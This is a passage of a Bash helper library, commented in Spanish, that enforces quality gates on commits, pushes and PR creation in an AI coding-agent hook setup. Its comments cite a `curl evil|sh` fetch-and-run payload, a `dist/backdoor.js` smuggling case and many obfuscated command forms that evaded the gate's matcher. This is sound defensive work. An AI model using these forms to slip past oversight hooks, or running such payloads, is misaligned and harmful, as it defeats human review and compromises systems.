#!/bin/bash
# dod-common.sh
# Helper sourceable con la logica compartida de la Definition of Done.
#
# Antes esta logica estaba duplicada en quality-gate.sh y mandatory-review.sh, y
# ambos corrian en el hook `Stop` — que dispara al final de CADA TURNO, no al final
# de la tarea. Resultado: los 3 gates se exigian en cada prompt que tocara un
# archivo productivo, incluido un fix de una linea. Costo real medido: 2-3x tokens
# por tarea (dos subagentes completos por turno) + linters en cada cierre de turno.
#
# Modelo actual (ADR-008): los gates corren en el PUNTO DE ENTREGA —
# `git commit` / `git push` / `gh pr create` — o cuando el dev los pide con
# /sap-gates. Ver rules/DEFINITION-OF-DONE.md.
#
# Uso:
#   source "${CLAUDE_PROJECT_DIR:-.}/hooks/scripts/lib/dod-common.sh"
#   dod_changed_files            -> imprime archivos productivos (vacio si no hay)
#   dod_is_meta_only "$FILES"    -> 0 si TODO es meta-stack (.claude/, hooks/, docs/)
#   dod_flag_fresh "$FLAG_FILE"  -> 0 si el flag existe y tiene < DOD_MAX_AGE_SECONDS
#   dod_delivery_tree "commit"   -> hash del arbol que se va a entregar
#   dod_flag_covers "$FLAG" "$T" -> 0 cubre, 1 ausente/vencido, 2 cubre OTRO arbol
#   dod_hotfix_state             -> imprime "ok|<approver>|<reason>", "invalid" o "none"
#   dod_json_escape "$texto"     -> imprime el texto como string JSON valido

# Red de seguridad, NO el control principal.
#
# El control real es el anclaje al hash del arbol (dod_flag_covers): si lo que se
# entrega es byte a byte lo que se reviso, la revision sigue valiendo aunque
# hayan pasado horas. El tiempo solo existe para que un flag olvidado no aplique
# tras un cambio de base o de dependencias que el arbol no captura.
#
# Antes eran 30 min y ERA el control: un ciclo real de dos gates con agentes
# tarda mas que eso, asi que el primero vencia mientras el segundo trabajaba.
DOD_MAX_AGE_SECONDS="${DOD_MAX_AGE_SECONDS:-86400}"   # 24 h

# Modo de operacion del stack (SES_MODE). Gradua cuanto exige y cuanto inyecta:
#
#   lite   spike, prototipo, exploracion. Solo Gate 1 al entregar (linters y
#          smells, que son baratos e irrenunciables). Sin refuerzo de agente.
#   full   default. Los 3 gates al entregar. Refuerzo cada N turnos.
#   ultra  codigo que va a PRD. Los 3 gates + los flags valen la mitad de tiempo,
#          para que una revision vieja no cubra codigo nuevo. Refuerzo el doble
#          de seguido.
#
# `lite` NO es una via para saltarse la calidad: Gate 1 sigue bloqueando
# CRITICAL. Es para que un spike de 20 minutos no pida dos subagentes.
dod_mode() {
    local m="${SES_MODE:-full}"
    case "$m" in
        lite|full|ultra) printf '%s' "$m" ;;
        *) printf 'full' ;;
    esac
}

# Patrones de archivo que cuentan como "codigo o configuracion ejecutable".
# Los hooks de git no tienen extension, asi que van por path. Un cambio en
# .husky/ altera cuando y como se enforcean los gates: es codigo productivo.
# El `^"` del final NO es una extension: es el caso en que git CITA el path.
# `core.quotePath=false` desactiva el escape de los no-ASCII —por eso los acentos
# y la ñ entran enteros— pero git sigue citando siempre que el nombre contenga un
# salto de linea, una comilla o una barra invertida. Ese path llega como
# `"srv/salto\nlinea.js"`, una sola linea que termina en comilla y no en `.js`, o
# sea que NO matcheaba: el archivo desaparecia del gate, y si era el unico cambio
# la lista quedaba vacia y la entrega salia permitida. Invisible, que es la peor
# forma de fallar.
#
# No se desescapa: desescapar devolveria el salto de linea y partiria el path en
# dos, que es el mismo problema por otra puerta. Se cuenta como productivo y
# listo. Sobre-bloquea un caso rarisimo —un .md con un salto de linea en el
# nombre— y ese es el lado correcto para equivocarse.
# Las extensiones que faltaban, y por que importan:
#
#   py       — es el entregable propio de `/sap-migration` (scripts de carga
#              LTMC) segun el CLAUDE.md de este repo. Un commit de SOLO un `.py`
#              con `os.system("curl evil|sh")` salia permitido, en silencio, sin
#              sello y sin que Gate 1 lo mirara. Era el hueco mas grande.
#   tf/tfvars— infraestructura: lo que aplica ahi es tan productivo como un ABAP.
#   xsjs/xsodata/hdbrole/hdbsynonym/hdbstructure — artefactos HANA que corren o
#              que otorgan permisos.
#   jsx/tsx/java/go/rb/ps1/bat — codigo, sin mas.
#
# Y los archivos SIN extension que igual se ejecutan: Makefile, Dockerfile,
# Jenkinsfile, Procfile. El patron era por extension y no los veia.
DOD_PRODUCTIVE_RE='\.(abap|prog|clas|cds|hdbcds|hdbcalculationview|hdbprocedure|hdbtable|js|mjs|cjs|ts|mts|cts|jsx|tsx|xml|json|yaml|yml|sh|sql|py|tf|tfvars|xsjs|xsodata|hdbrole|hdbsynonym|hdbstructure|java|go|rb|ps1|bat|hdbtablefunction|hdbview|properties)$|^\.husky/|(^|/)([Mm]akefile|[Dd]ockerfile|Jenkinsfile|Procfile)$|^"'
# `dist/` NO esta aca, a proposito. Estaba, y eso hacia falso el argumento de
# que "solo se exime lo que la comprobacion del emisor valida": se sacaba de
# `DOD_GENERADOS_RE` y seguia desapareciendo por esta puerta, antes de que nada
# lo mirara. Un `git add -f dist/backdoor.js` salia sin gate, sin nota y sin log.
# Ningun `--check` cubre `dist/`, asi que cuenta como codigo productivo.
DOD_EXCLUDE_RE='^(\.claude/|tmp/|node_modules/|\.git/|docs/|client-docs/|coverage/|logs/|README|CHANGELOG|memory/)|\.md$'

# ── Descubrimiento de archivos: falla CERRADO ───────────────────────────────
#
# AUDITORIA A3. Los tres scanners y el gate descubren archivos con
# `git diff --name-only HEAD 2>/dev/null`. Si git falla —repo sin HEAD, indice
# corrupto, git ausente— el comando devuelve VACIO y el gate concluye "no hay
# nada que revisar" y aprueba. Es el mismo mecanismo que mantuvo escondido el
# bypass por `core.quotePath` durante meses: los fallos se veian como "limpio".
#
# `dod_git_paths` separa las dos situaciones:
#   git responde y no hay archivos  -> vacio, exito (0). No hay nada, correcto.
#   git FALLA                       -> exit 1 + motivo por stderr. El llamador
#                                      NO puede interpretarlo como "limpio".
#
# Uso: dod_git_paths [--con-fixtures]   (imprime un path por linea)
dod_git_paths() {
    local con_fixtures=0
    [[ "${1:-}" = "--con-fixtures" ]] && con_fixtures=1

    # stdout y stderr SEPARADOS. Con `2>&1` un warning de git ("warning: unable to
    # access ...") entraba a la lista de paths y podia pasar el filtro por
    # extension, inventando un archivo cambiado.
    local diff_out ls_out rc_diff rc_ls err_diff err_ls
    err_diff=$(mktemp) ; err_ls=$(mktemp)
    # `diff HEAD` mira el WORKING TREE contra HEAD, y con eso solo hay un archivo
    # que desaparece: el que esta staged y despues REVERTIDO en el working tree.
    # Ahi `git status` dice `MM`, `git diff HEAD` sale VACIO —el working tree es
    # identico a HEAD— y sin embargo `git commit -m` publica el indice, que trae
    # otra cosa. Se agrega `diff --cached HEAD` para que ese archivo exista para
    # todos los consumidores: Gate 1, el husky y el reviewer.
    diff_out=$(git -c core.quotePath=false diff --name-only HEAD 2>"$err_diff"
               git -c core.quotePath=false diff --cached --name-only HEAD 2>>"$err_diff"); rc_diff=$?
    ls_out=$(git -c core.quotePath=false ls-files --others --exclude-standard 2>"$err_ls"); rc_ls=$?

    if [[ $rc_diff -ne 0 ]]; then
        printf '[DoD] no se pudo listar los archivos modificados (git diff exit %s): %s\n' \
            "$rc_diff" "$(head -2 "$err_diff" | tr '\n' ' ')" >&2
        rm -f "$err_diff" "$err_ls"; return 1
    fi
    if [[ $rc_ls -ne 0 ]]; then
        printf '[DoD] no se pudo listar los archivos nuevos (git ls-files exit %s): %s\n' \
            "$rc_ls" "$(head -2 "$err_ls" | tr '\n' ' ')" >&2
        rm -f "$err_diff" "$err_ls"; return 1
    fi
    rm -f "$err_diff" "$err_ls"

    {
        printf '%s\n' "$diff_out"
        printf '%s\n' "$ls_out"
        if [[ $con_fixtures -eq 1 ]]; then
            git -c core.quotePath=false ls-files 'hooks/scripts/__smoketest__/fixtures/*' 2>/dev/null || true
        fi
    } | sed '/^$/d' | sort -u | {
        # Si git cito algun path, se avisa: cuenta como productivo (ver
        # DOD_PRODUCTIVE_RE) y el dev tiene que saber por que se le pide un gate
        # sobre algo que parecia documentacion.
        local salida; salida=$(cat)
        if printf '%s\n' "$salida" | grep -q '^"'; then
            echo "[DoD] hay rutas que git tuvo que citar (salto de linea, comilla o barra en el nombre)." >&2
            echo "[DoD] no se pueden leer con seguridad: cuentan como codigo productivo." >&2
        fi
        printf '%s\n' "$salida"
    }
}

# 0 (true) si el archivo se puede leer para escanearlo.
#
# Un archivo BORRADO sigue apareciendo en `git diff --name-only`, y no poder
# leerlo es lo esperado: no hay nada que escanear. Pero un archivo que EXISTE y
# no se puede leer es otra cosa — el scan no ocurrio, y decir "limpio" seria
# falso. El llamador distingue con `dod_no_legible`.
dod_es_legible() { [[ -r "$1" ]]; }
dod_no_legible() { [[ -e "$1" && ! -r "$1" ]]; }

# ¿El comando invoca `git <subcomando>`, con o sin opciones globales?
#
# `git -C <dir>`, `git -c <k=v>`, `git --no-pager`, `git --git-dir=…` y
# `git  push` con dos espacios son todos la misma entrega. El gate los detectaba
# con un patron literal `git[[:space:]]+push` en CUATRO lugares distintos, asi que
# ninguna de esas formas disparaba nada: todo el aparato de decision —destino
# resuelto por git, frontera por ascendencia, approvals por hash de arbol— no
# llegaba a correr. Un typo de dos espacios saltaba el gate entero.
#
# Vive aca y no en cada llamador por la misma razon que el resto: cuatro copias
# de una regla son cuatro veredictos.
# `git` puede venir con ruta: `/usr/bin/git push`, `~/bin/git commit`. Sin esto el
# disparador no matcheaba y la entrega salia sin gates — la misma clase que el
# `git push` literal, con el prefijo como pretexto nuevo.
DOD_GIT_BIN='([^[:space:];&|]*/)?git'
# `--git-dir .git` (valor SEPARADO) es tan valido como `--git-dir=.git`, y git
# acepta las dos formas para todas las opciones con valor. Sin la alternativa
# espaciada, `--work-tree`, `--exec-path` y `--namespace` salteaban el disparador.
# El `[^-]` del valor evita comerse el subcomando que viene despues.
# Un valor puede venir ENTRECOMILLADO y con espacios adentro: el caso real es
# `git -c user.name="Bob McPhee" commit -m x`, o sea cualquier repo cuyo usuario
# tenga nombre compuesto. El shell lo entrega como UN argumento; el regex lo veia
# como dos, se cortaba en `McPhee"` y no llegaba al subcomando. El gate no
# disparaba, y sin una linea de aviso.
#
# Las alternativas con comillas van PRIMERO: la alternancia de ERE no es golosa y
# la variante sin comillas matchearia solo el prefijo. Se usan comillas DOBLES
# para el literal de bash porque el patron contiene las simples; no hay `$` ni
# backtick adentro, asi que no hay expansion que cuidar.
DOD_GIT_OPTS="([[:space:]]+(-[A-Za-z][[:space:]]+[^[:space:]]*[\"'][^\"']*[\"'][^[:space:]]*|--[a-z-]+=[^[:space:]]*[\"'][^\"']*[\"'][^[:space:]]*|-[A-Za-z][[:space:]]+[^[:space:]]+|-[A-Za-z]|--[a-z-]+=[^[:space:]]+|--[a-z-]+[[:space:]]+[^-][^[:space:]]*|--[a-z-]+))*"

# Que puede preceder a `git`: CUALQUIER COSA QUE NO SEA PARTE DE UNA PALABRA.
#
# Esto fue una lista, y la lista fue el defecto. La ronda 26 la amplio de
# `[;&|[:space:]]` a `[;&|[:space:]"'`]` para cerrar `sh -c "git commit"`,
# `bash -c`, `eval` y `env FOO=bar sh -c` —las formas que se habian medido— y
# cerro esas y no la clase. Una revision posterior midio SIETE mas que seguian
# entregando sin gates, de punta a punta contra el hook:
#
#   (git commit)      $(git commit)     x=$(git commit)     !git commit
#   \git commit       <(git commit)     >(git push)
#
# `\git` es el idiom para saltear un alias; `(…)` agrupa pasos; `$(…)` y `<(…)`
# son sustitucion. Agregar `(` `!` `\` habria sido la octava vuelta de la misma
# enumeracion. Se invierte: `git` tiene que EMPEZAR UNA PALABRA, o sea que antes
# va cualquier caracter que no pueda ser parte de un identificador. Es la misma
# regla que el sufijo ya usaba (`[^A-Za-z0-9_-]`), aplicada del otro lado.
#
# El `.` queda afuera para que `repo.git commit` no cuente. `legit`, `digit`,
# `mygit` siguen sin matchear: la letra de adelante es parte de la palabra.
#
# El precio es el mismo que ya se aceptaba: `echo "git commit"` deniega. Un falso
# positivo cuesta un mensaje; un falso negativo publica codigo sin revisar, en
# silencio. Ante la ambiguedad, un control de seguridad falla cerrado. Por eso
# tampoco hay allowlist de `echo|cat|grep` al principio: `echo x; git commit`
# tambien empieza con `echo`.
#
# LIMITE CONOCIDO, y documentado a proposito: la indireccion por variable
# (`G=git; $G commit`) no se puede ver estaticamente. Ahi la barrera son los
# niveles siguientes de ADR-013 —`.husky/pre-commit`, `.husky/pre-push` y CI—,
# que miran el commit y no el texto del comando.
DOD_GIT_PRE='[^A-Za-z0-9_.-]'

# El comando con lo que bash resuelve ANTES de ejecutar, aplanado.
#
# Bash procesa el texto antes de correrlo, y el matcher mira el texto. Cada cosa
# que bash resuelve y el matcher no es una forma de escribir `git commit` que el
# nivel 1 no ve. Las medidas, en orden:
#
#   citado ANSI-C    $'\x67\x69\x74' commit     `$'git\x20commit'`
#   llaves           {git,commit} -m x          git {commit,}
#   comillas/barras  "git" commit   git c''ommit   git \<salto>commit
#
# Se matchea sobre el comando crudo Y sobre esta forma, y alcanza con UNO. NO se
# reemplaza el crudo: aplanar rompe `git -C "dir con espacio" commit`, donde el
# argumento citado de `-C` se parte y el matcher deja de ver el `commit`.
#
# ES BEST-EFFORT, Y ESTE NIVEL LO ES POR DISEÑO. Bash no se puede analizar
# estaticamente de forma completa: una funcion envoltorio
# (`f(){ git "$@"; }; f commit`), un alias, la indireccion por variable, `xargs`,
# `find -exec`, un `python -c` — cada ronda de revision encontro formas nuevas.
# ADR-013 no pone la garantia aca: este hook es el AVISO TEMPRANO. La barrera es
# git, que ejecuta `.husky/pre-commit` en todo commit sin importar como se lo
# invoco, y CI, que deniega el commit sin trailer si alguien salteo husky con
# `--no-verify`. Medido con las seis formas, incluidas dos que ningun texto
# revela: git las bloquea todas. Lo fija `tests/unit/nivel2-bloquea.test.js`.
# Resuelve los `$'...'` de un texto como lo haria bash: `\xHH`, `\uHHHH`,
# `\UHHHHHHHH`, octal `\NNN` y los de una letra. Lo usa el camino grande de
# `_dod_aplanar`, donde hacerlo en bash seria cuadratico.
#
# PYTHON3, Y SOLO PYTHON3. Una version usaba node, y el Gate 3 midio el costo: node
# arranca en ~113 ms en frio, y eso se pagaba en cada comando de mas de 256
# caracteres con `$'`, fuera o no una entrega (p95 de 97 a 218 ms). `python3 -I -S`
# arranca en ~11 ms, y ya es el parser principal de `dod_tool_command`. Una sola
# implementacion: tener el resolvedor en dos lenguajes seria dos definiciones de
# la misma regla, que es la clase que esta rama cierra. Sin python3 no se resuelve
# (best-effort; el nivel 2 frena lo que el nivel 1 no ve).
#
# `-I`: ignora las `PYTHON*` del entorno, que es justo por donde se inyecta estado
# en un proceso que no lo espera.
#
# UN ESCAPE INVALIDO NO TIRA EL RESTO. Con node, un `$'\U110000'` —fuera de
# Unicode— hacia caer el programa entero y se perdia la resolucion de TODOS los
# `$'...'` del comando: `$'\U110000'; git $'\x63ommit'` pasaba el nivel 1. Lo
# encontro el Gate 2. Ahora cada escape se resuelve aparte, y el que no se puede
# (fuera de rango, sustituto suelto) queda como texto.
#
# Sin comillas simples en el codigo (`\x27`), para poder guardarlo asi.
_DOD_ANSI_C_PY='
import re, sys
b = sys.stdin.buffer.read()
L = {"n": "\n", "t": "\t", "r": "\r", "a": "\x07", "b": "\b", "e": "\x1b", "E": "\x1b", "f": "\f", "v": "\v"}
def esc(m):
    e = m.group(1)
    if e[0] in "xuU":
        v = int(e[1:], 16)
        if v > 0x10FFFF or 0xD800 <= v <= 0xDFFF:
            return m.group(0)
        return chr(v)
    if e[0] in "01234567":
        return chr(int(e, 8) & 0xFF)
    return L.get(e, e)
def seg(m):
    return re.sub(r"\\(x[0-9a-fA-F]{1,2}|u[0-9a-fA-F]{1,4}|U[0-9a-fA-F]{1,8}|[0-7]{1,3}|[\s\S])", esc, m.group(1))
try:
    d = b.decode("utf-8", "surrogateescape")
    sys.stdout.buffer.write(re.sub(r"\$\x27((?:[^\x27\\]|\\[\s\S])*)\x27", seg, d).encode("utf-8", "surrogateescape"))
except Exception:
    sys.stdout.buffer.write(b)
'

# Memo del ultimo aplanado. Se inicializa AL SOURCEAR, con asignacion simple:
# asi no se puede plantar desde el entorno, que es la clase que
# `tests/unit/env-allowlist.test.js` existe para cerrar.
_DOD_APLANADO_DE=''
_DOD_APLANADO=''

# Calcula el aplanado de `$1` y lo deja en `_DOD_APLANADO`. Se llama SIN `$( )`
# para que la asignacion quede en el shell del llamador y el memo sobreviva entre
# llamadas; adentro, el camino grande si forkea `awk` y `tr`.
#
# UNA VEZ POR COMANDO: `delivery-gate.sh` pregunta por `commit`, por `push` y por
# `gh pr create`, y antes cada pregunta aplanaba de nuevo.
#
# Y LO GRANDE EN UNA SOLA PASADA LINEAL. Los pasos 1 y 2 reemplazaban con
# `${s/"$m"/…}` sobre el string entero, hasta 20 vueltas, y en bash 3.2 esa
# sustitucion es cuadratica. Lo midio el Gate 3: un heredoc de JS de 20 KB con
# `.push(` y un `{a,b}` —que NO es una entrega, pero trae la palabra y entra al
# slow path— tardaba 4 s con 20 KB y mas de 90 s con 100 KB, arriba del timeout
# de 60 s del hook. (Una version de este comentario decia "76 s con 20 KB"; no se
# reprodujo.) En cada comando
# Bash que mencionara push o commit. Es la tercera vez que la sustitucion de bash
# 3.2 aparece como cuello en este ciclo, asi que la regla es general: sobre 256
# caracteres, nada de sustituciones en bash.
#
# El camino grande resuelve los `$'…'` con python3 cuando esta; sin el, `\x63ommit`
# queda como `x63ommit`. Es best-effort igual que todo este nivel; el nivel 2
# frena lo que el nivel 1 no ve.
_dod_aplanar() {
    # `LC_ALL=C` para toda la funcion: con `C.UTF-8` —el locale de Claude Code— la
    # regex `[[ =~ ]]` de bash 3.2 no matchea sobre un texto con un byte que no es
    # UTF-8, y `echo \xff; git $'\x63ommit'` quedaba sin resolver. Lo midio el
    # Gate 3. Todo lo que se busca aca es ASCII.
    local LC_ALL=C
    local s="$1" i m inner r
    if [[ "$1" == "$_DOD_APLANADO_DE" && -n "$1" ]]; then
        return 0
    fi
    if (( ${#s} > 256 )); then
        # 1. `$'...'` con python3, en una pasada. Sin esto `git $'\x63ommit'`
        #    acolchado a mas de 256 caracteres pasaba el nivel 1: el `tr` de abajo
        #    deja `x63ommit`. Solo si el comando trae `$'`; sin python3 queda como
        #    antes (best-effort, el nivel 2 lo frena). Lo midieron los dos gates.
        if [[ "$s" == *"\$'"* ]] && command -v python3 >/dev/null 2>&1; then
            r=$(printf '%s' "$s" | python3 -I -S -c "$_DOD_ANSI_C_PY" 2>/dev/null) && s="$r"
        fi
        # 2. Barra + salto de linea se une; despues se borran comillas, barras,
        #    llaves y `$`, y la coma pasa a espacio.
        #
        #    `LC_ALL=C` en los tres: con locale UTF-8 el `awk` de macOS aborta ante
        #    un byte que no es UTF-8 ("towc: multibyte conversion failure"), el
        #    aplanado quedaba VACIO y una forma ofuscada pasaba el nivel 1. El
        #    entorno de Claude Code es `C.UTF-8`. Regresion de la ronda anterior;
        #    la encontro el Gate 3.
        s=$(printf '%s' "$s" \
            | LC_ALL=C awk '{ if (sub(/\\$/, "")) printf "%s", $0; else print }' \
            | LC_ALL=C tr -d "\\\\\"'{}\$" | LC_ALL=C tr ',' ' ')
    else
        # 1. `$'...'`: se resuelven los escapes como lo haria bash. ANTES de borrar
        #    barras: sin esto `\x20` quedaba como `x20`. `printf %b` corta en `\c`
        #    (`$'git\ccommit'` da `git`): limite conocido, el nivel 2 lo frena.
        for (( i=0; i<20; i++ )); do
            [[ "$s" =~ \$\'([^\']*)\' ]] || break
            m="${BASH_REMATCH[0]}"; inner="${BASH_REMATCH[1]}"
            printf -v r '%b' "$inner"
            s="${s/"$m"/$r}"
        done
        # 2. Llaves sin espacios adentro: `{git,commit}` -> `git commit`. Bash
        #    expande `x{a,b}` a `xa xb` y esto da `xa b`; para decidir si hay una
        #    entrega alcanza, y el error cae del lado de denegar.
        for (( i=0; i<20; i++ )); do
            [[ "$s" =~ \{([^{}[:space:]]*,[^{}[:space:]]*)\} ]] || break
            m="${BASH_REMATCH[0]}"; inner="${BASH_REMATCH[1]}"
            s="${s/"$m"/${inner//,/ }}"
        done
        # 3. Comillas y barras.
        s="${s//\\$'\n'/}"
        s="${s//\\/}"
        s="${s//\"/}"
        s="${s//\'/}"
    fi
    _DOD_APLANADO_DE="$1"
    _DOD_APLANADO="$s"
}

# El aplanado de `$1`, impreso. Para quien lo necesite como texto (los tests).
_dod_cmd_aplanado() {
    _dod_aplanar "$1"
    printf '%s' "$_DOD_APLANADO"
}

# `LC_ALL=C` en cada `grep` de los matchers: con locale UTF-8 —el de Claude Code
# es `C.UTF-8`— un byte que no es UTF-8 en CUALQUIER parte del comando hacia que
# el grep no matcheara nada, y un `git commit` sin ofuscar pasaba el nivel 1. La
# regex es ASCII, asi que comparar por bytes no cambia lo que reconoce.
dod_es_subcomando_git() {
    local cmd="$1" sub="$2" re
    # El sufijo es un BORDE DE PALABRA, no "espacio o fin de linea".
    #
    # Con `([[:space:]]|$)` estas entregaban sin gates, medidas de punta a punta
    # contra el hook: `git commit; echo hi`, `git commit>/tmp/x`,
    # `git commit&&echo done` (sin espacio), `git commit|cat`, `git push;`. Bash
    # acepta `;` `&` `|` `>` `<` `)` como fin de comando SIN espacio previo, y
    # ninguno esta en `[[:space:]]`.
    #
    # `[^A-Za-z0-9_-]` excluye el guion a proposito, para que `git commit-tree`
    # no cuente como `commit`.
    re="(^|${DOD_GIT_PRE})${DOD_GIT_BIN}${DOD_GIT_OPTS}[[:space:]]+${sub}($|[^A-Za-z0-9_-])"
    printf '%s' "$cmd" | LC_ALL=C grep -qE "$re" && return 0
    _dod_aplanar "$cmd"
    printf '%s' "$_DOD_APLANADO" | LC_ALL=C grep -qE "$re"
}

# `gh pr create` — la tercera entrega, junto a `git commit` y `git push`.
#
# Vivia como literal COPIADO en dos lineas de `delivery-gate.sh`, con los mismos
# defectos que `dod_es_subcomando_git`. Usa la misma clase de precedencia y la
# misma doble pasada, para que las dos puertas no vuelvan a divergir.
dod_es_gh_pr_create() {
    # `new` es el alias oficial de `create` (`gh pr create --help` lo lista).
    local re="(^|${DOD_GIT_PRE})gh[[:space:]]+pr[[:space:]]+(create|new)($|[^A-Za-z0-9_-])"
    printf '%s' "$1" | LC_ALL=C grep -qE "$re" && return 0
    _dod_aplanar "$1"
    printf '%s' "$_DOD_APLANADO" | LC_ALL=C grep -qE "$re"
}

# Arboles GENERADOS por los emisores. Se escanea la FUENTE, no la salida.
#
# Sin esto, un template ABAP vendored copiado a `fixtures/` se reportaba una vez
# por host —el mismo archivo, cuatro veces— y encima sobre contenido de terceros
# que el stack no edita. El hallazgo era real en el archivo original y ya se
# evalua ahi; repetirlo en las copias solo entrena a ignorar el gate.
# `dist/` NO esta: ningun `--check` lo valida. Los emisores comparan su salida
# contra `fixtures/<host>` y `plugins/`, y a `dist/<host>` lo BORRAN y regeneran
# antes de comparar — o sea que un archivo colado ahi con `git add -f` se destruia
# del working tree y seguia vivo en el commit, exento y sin que nada lo mirara.
# Solo se exime lo que la comprobacion del emisor realmente cubre.
# Las rutas nombradas son EXACTAMENTE las que `ses build --check` compara: las
# cuatro raices de bundle, ni una mas.
#
# Antes decia `^(fixtures/|plugins/)`, o sea el subarbol entero — y bajo
# `plugins/` viven 22 archivos trackeados que ningun emisor genera y ningun
# `--check` mira: `plugins/.claude-plugin/marketplace.json` y los 21 de
# `plugins/skill-creator/` (vendoreados, con 10 `.py` ejecutables). Quedaban
# EXENTOS de los gates 2 y 3 por una exencion que se justifica en una
# verificacion que nunca los tocaba. Reproducido de punta a punta, con el push
# publicado en el remoto.
#
# Es el mismo razonamiento que ya esta escrito para `dist/` —"no se excluye por
# ninguna via, porque ningun `--check` lo valida"— aplicado de forma
# inconsistente: la frase era falsa para estas 22 rutas.
#
# La regla, para el que agregue un host: si `--check` no lo compara, no va aca.
DOD_GENERADOS_RE='^(plugins/sap-enterprise-stack/|fixtures/(codex|copilot|opencode)/)'

# ¿La salida generada del repo es REALMENTE la que producen los emisores?
#
# ESTA ES LA PREGUNTA, Y NO SE CONTESTA MIRANDO RUTAS. Hubo tres intentos antes
# de este, y los tres eran la misma heuristica con distinta ropa:
#
#   1. "excluir `fixtures/|plugins/|dist/` siempre" → un backdoor escrito a mano
#      en el artefacto que se distribuye salia exento como meta-stack.
#   2. "excluir si hay ALGUNA fuente en el cambio" → tocabas `settings.json` —un
#      byte— y de paso metias el backdoor.
#   3. "excluir si hay una fuente con el MISMO SUFIJO de ruta" → llamabas al
#      payload `settings.json`, o le dabas la ruta relativa del archivo que ibas
#      a tocar igual en un commit de sync.
#
# Cada parche movia el pretexto sin cerrar la clase: siempre hay una ruta mas
# especifica y un nombre mas. Es la misma leccion que el parseo del texto del
# comando, y la salida es la misma: dejar de inferir y resolver el hecho.
#
# `ses build --host <h> --check` regenera el bundle y lo compara BYTE A BYTE con
# lo que hay en el arbol. Es una pregunta cerrada, ya existe, y es la que corre
# `emitters.yml` en CI — asi que ademas deja de haber dos reglas donde ADR-013
# promete una. Medido: ~0,2 s materializar el arbol + ~0,7 s los cuatro hosts, y
# solo se paga cuando el cambio toca salida generada.
#
# FALLA CERRADO: si no se puede correr la comprobacion —sin node, sin `bin/ses.mjs`,
# un host que falla— la salida generada cuenta como productiva y exige los gates.
# Los hosts que emiten un bundle.
#
# Esta HARDCODEADA, y se dice. Hubo una version que pretendia leerla de
# `stack.manifest.json`, pero el manifiesto no declara `hosts` en ningun lado:
# la rama estaba muerta y toda invocacion caia al fallback. Fingir portabilidad
# que no funciona es peor que admitir la duplicacion — al menos asi se ve.
#
# MANTENER SINCRONIZADO con `HOSTS` en `bin/ses.mjs`. Lo cubre
# `tests/unit/emisores-copian-modulos.test.js`, que falla si divergen.
dod_hosts() {
    echo "claude codex opencode copilot"
}

# Recibe EL ARBOL que se entrega, no mira el working tree.
#
# POR QUE IMPORTA. `ses build --check` lee un directorio. Si le dabamos el
# working tree, la pregunta era sobre un objeto y la respuesta se aplicaba a
# otro: se commiteaba el backdoor, se dejaba el working tree prolijo, y el push
# quedaba EXENTO publicando exactamente ese backdoor. Y al reves, una fuente
# editada-y-no-regenerada en el working tree denegaba un push que no tenia nada
# malo.
#
# El arbol se materializa con `git archive` (0,2 s) y se comprueba ahi. Asi la
# pregunta y la clasificacion miran lo mismo — que es la unica forma de que la
# respuesta signifique algo.
dod_generados_verificados() {
    local arbol="$1" raiz="${CLAUDE_PROJECT_DIR:-.}" tmp h rc=0 err _malas=""
    # Los `return 1` de abajo NO necesitan dejar nada escrito: sin registro,
    # `dod_raices_malas_de` responde "todas". Antes habia una linea que ponia
    # todas las raices y estaba DESPUES de estos returns, o sea que el comentario
    # que decia "falla cerrado" describia algo que en esos caminos no corria.
    [[ -n "$arbol" ]] || return 1
    command -v node >/dev/null 2>&1 || return 1
    tmp=$(mktemp -d 2>/dev/null) || return 1
    err=$(mktemp 2>/dev/null) || err=/dev/null
    # Sin esto, interrumpir el hook —ESC en Claude Code mata el PreToolUse— dejaba
    # el arbol materializado entero en TMPDIR. Medido: ~13 MB por arbol, y desde
    # que se verifica un arbol por cada candidato de la entrega, hasta el doble
    # por aborto. No es corrupcion, es basura, pero se paga cada vez que el dev
    # cambia de idea. SIGKILL no se puede atajar y esa basura queda.
    # SIGKILL no se puede atajar; INT y TERM si, que son los que manda el editor.
    trap '[[ -n "${tmp:-}" ]] && rm -rf "$tmp"; [[ -n "${err:-}" && "$err" != /dev/null ]] && rm -f "$err"; exit 130' INT TERM
    # `pipefail` en un subshell: sin el, el `if` mira el estado de `tar`, que sale
    # 0 aunque `git archive` haya fallado y le haya pasado un stream vacio. El
    # resultado era un directorio VACIO tratado como arbol materializado. Hoy lo
    # ataja el chequeo de `bin/ses.mjs` de mas abajo, que falla cerrado; pero eso
    # es una red, no la respuesta. Va en subshell para no tocar las opciones del
    # shell del llamador — esto es una lib que se sourcea.
    if ! ( set -o pipefail
           git -C "$raiz" archive "$arbol" 2>/dev/null | tar -x -C "$tmp" 2>/dev/null ); then
        trap - INT TERM
        rm -rf "$tmp"; [[ "$err" != /dev/null ]] && rm -f "$err"; return 1
    fi
    # El arbol se comprueba con SUS PROPIOS emisores, no con los del working tree.
    # Mezclarlos compara emisor nuevo contra fixture vieja y da un fallo que no
    # existe; el arbol tiene que describirse a si mismo.
    if [[ ! -f "${tmp}/bin/ses.mjs" ]]; then
        # El `trap - INT TERM` va en CADA salida, no solo en la feliz. Si no, el
        # trap sobrevive al `return` referenciando un `tmp` que ya salio de
        # scope, y un INT posterior dispara un `exit 130` fuera de contexto: el
        # dev ve al hook morir sin saber si el commit ocurrio.
        trap - INT TERM
        rm -rf "$tmp"; [[ "$err" != /dev/null ]] && rm -f "$err"; return 1
    fi
    # `node_modules` no viaja en el arbol y los emisores lo necesitan para resolver.
    [[ -d "${raiz}/node_modules" && ! -e "${tmp}/node_modules" ]] \
        && ln -s "$(cd "$raiz" && pwd)/node_modules" "${tmp}/node_modules" 2>/dev/null
    # Con techo de tiempo: es un PreToolUse, y un emisor colgado deja al dev
    # mirando un prompt clavado sin saber si el commit ocurrio.
    # Se anota la raiz que falla, no solo que algo fallo. Sin eso, una
    # desincronizacion en UN bundle arrastraba el markdown de los CUATRO a la
    # lista de archivos productivos, y con eso bloqueaba entregas donde lo que
    # estaba mal no era lo que se entregaba.
    for h in $(dod_hosts); do
        if ! ( cd "$tmp" && DOD_TIMEOUT_SEG="${DOD_TIMEOUT_SEG:-60}" \
               node -e '
const {spawnSync}=require("child_process");
const r=spawnSync(process.execPath,["bin/ses.mjs","build","--host",process.argv[1],"--check"],
  {timeout:Number(process.env.DOD_TIMEOUT_SEG)*1000,encoding:"utf8"});
process.stderr.write((r.stdout||"")+(r.stderr||""));
process.exit(r.status===0?0:1);' "$h" ) 2>>"$err"; then
            rc=1
